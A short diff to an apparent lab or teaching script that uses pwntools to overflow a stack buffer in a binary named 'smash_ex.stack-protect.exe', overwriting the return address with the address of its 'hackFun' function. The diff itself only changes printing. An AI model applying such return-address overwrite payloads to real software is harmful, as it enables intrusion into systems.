@@ -1,3 +1,4 @@
+#!/usr/bin/python3
 from pwn import *
 prog = pwnlib.elf.load('smash_ex.stack-protect.exe')
 fun_addr = prog.symbols['hackFun']
@@ -13,6 +14,7 @@ bytes_to_send = b'00000000'*3 + p64(fun_addr, 'little')
 
 p.send(bytes_to_send)
 lines = p.readall()
-for line in lines:
-  print(line.decode())
+print(lines)
+#for line in lines:
+#  print(line.decode())
 
